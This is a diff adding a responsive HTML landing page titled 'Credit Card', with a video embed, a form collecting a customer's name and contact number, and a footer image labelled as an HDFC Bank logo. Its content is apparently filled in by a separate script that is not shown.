@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Credit Card</title>
+    <style>
+        :root {
+            --primary-color: #007BFF;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 100%;
+            margin: 0 auto;
+            padding: 0 10px;
+        }
+        video, iframe {
+            width: 100%;
+            max-width: 100%;
+            height: auto;
+            margin-top: 40px;
+        }
+       
+        form {
+            display: flex;
+            flex-direction: column;
+            max-width: 100%;
+            margin: 0 auto;
+        }
+       
+        label {
+            margin-bottom: 5px;
+            font-weight: bold;
+            text-align: left;
+            display: block; /* Ensure label takes up full width */
+        }
+        input {
+            margin-bottom: 15px; /* Space between fields */
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px; /* More rounded corners */
+            width: 100%; /* Full width */
+            box-sizing: border-box; /* Include padding in width calculation */
+        }
+        button {
+            border: none;
+            background-color: var(--primary-color);;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            width: 100%; /* Full width */
+            box-sizing: border-box; /* Include padding in width calculation */
+            transition: background-color 0.3s ease;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .header-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            background-color: var(--primary-color);
+            color: white;
+            border-radius: 5px;
+        }
+        .header-container img {
+            width: 50%; /* Responsive logo width */
+            max-width: 200px; /* Limit maximum width */
+            height: auto;
+        }
+        h2 {
+            text-align: center;
+            margin-top: 50px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        /* Responsive design adjustments */
+        @media (min-width: 1024px) {
+           body{
+            /* width:70%; */
+            display: flex;
+            justify-content: center;
+            padding: 20px;
+
+           }
+         
+
+           h1{
+                font-size: 20px;
+            }
+        }
+
+
+        @media (max-width: 480px) {
+            .header-container img {
+                width: 90%; /* Further adjust logo size for very small screens */
+            }
+            h2 {
+                font-size: 18px; /* Further adjust heading size for very small screens */
+            }
+            button {
+                font-size: 12px; /* Further adjust button font size for very small screens */
+            }
+            h1{
+                font-size: 20px;
+            }
+            .footer img{
+              width: 100%;
+              height: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header-container">
+            <h1 id="heading" ></h1>
+        </div>
+
+        <!-- Video Embed -->
+        <div class="video-container">
+            <iframe id="video" width="560" height="400" src=" " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        </div>
+
+        <!-- Detail Form -->
+        <div class="form-container">
+            <h2>Customer Details</h2>
+            <form id="detailsForm">
+                <label for="name">Name</label>
+                <input type="text" id="name" name="name" placeholder="Enter your name" required>
+
+                <label for="number">Contact Number</label>
+                <input type="tel" id="number" name="number" placeholder="Enter your contact number" required>
+
+                <button type="submit">Proceed Now</button>
+            </form>
+        </div>
+
+<div class="footer" style=" margin-top: 40px;"  >
+
+    <img id="img" src="" alt="HDFC Bank Logo" style="height:100%; border: var(--primary-color) solid 1px; border-radius: 10px;  ">
+
+</div>
+    </div>
+<script src="script.js"></script>
+</body>
+</html>
